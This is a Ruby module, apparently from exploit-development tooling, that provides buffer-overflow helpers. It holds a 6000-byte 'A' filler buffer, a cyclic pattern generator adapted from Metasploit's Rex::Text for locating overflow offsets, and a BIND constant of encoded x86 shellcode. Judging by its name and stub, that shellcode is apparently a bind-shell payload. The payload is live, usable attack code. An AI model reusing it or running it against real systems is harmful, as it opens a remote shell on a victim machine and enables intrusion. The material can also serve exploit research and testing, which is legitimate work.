#
# A module that includes various shellcodes and aptterns
#
module L32shellcode
  SIMPLE = "\x41"*6000
  UpperAlpha   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  LowerAlpha   = "abcdefghijklmnopqrstuvwxyz"
  Numerals     = "0123456789"
  BIND = "\xdb\xdb\xd9\x74\x24\xf4\x5a\xb8\x48\x27\x93\x86\x2b\xc9" +
    "\xb1\x14\x31\x42\x19\x83\xc2\x04\x03\x42\x15\xaa\xd2\xa2" +
    "\x5d\xdd\xfe\x96\x22\x72\x6b\x1b\x2c\x95\xdb\x7d\xe3\xd5" +
    "\x47\xdc\xa9\xbd\x75\xe0\x5c\x61\x10\xf0\x0f\xc9\x6d\x11" +
    "\xc5\x8f\x35\x1f\x9a\xc6\x87\x9b\x28\xdc\xb7\xc2\x83\x5c" +
    "\xf4\xba\x7a\x91\x7b\x29\xdb\x43\x43\x16\x11\x13\xf2\xdf" +
    "\x51\x7b\x2a\x0f\xd1\x13\x5c\x60\x77\x8a\xf2\xf7\x94\x1c" +
    "\x58\x81\xba\x2c\x55\x5c\xbc"



  # Taken from Rex::Text
  def self.pattern(length=6000, sets = nil)
          buf = ''
          idx = 0
          offsets = []

          sets ||= [ UpperAlpha, LowerAlpha, Numerals ]

          return "" if length.to_i < 1
          return sets[0][0].chr * length if sets.size == 1 and sets[0].size == 1

          sets.length.times { offsets << 0 }

          until buf.length >= length
                  begin
                          buf << converge_sets(sets, 0, offsets, length)
                  end
          end

          if (buf.length < length)
                  buf = buf * (length / buf.length.to_f).ceil
          end

          buf[0,length]
  end
  protected
  # Taken from Rex::Text
  def self.converge_sets(sets, idx, offsets, length) # :nodoc:
        buf = sets[idx][offsets[idx]].chr

        # If there are more sets after use, converage with them.
        if (sets[idx + 1])
                buf << converge_sets(sets, idx + 1, offsets, length)
        else
                # Increment the current set offset as well as previous ones if we
                # wrap back to zero.
                while (idx >= 0 and ((offsets[idx] = (offsets[idx] + 1) % sets[idx].length)) == 0)
                        idx -= 1
                end

                # If we reached the point where the idx fell below zero, then that
                # means we've reached the maximum threshold for permutations.
                if (idx < 0)
                        return buf
                end

        end

        buf
  end
end
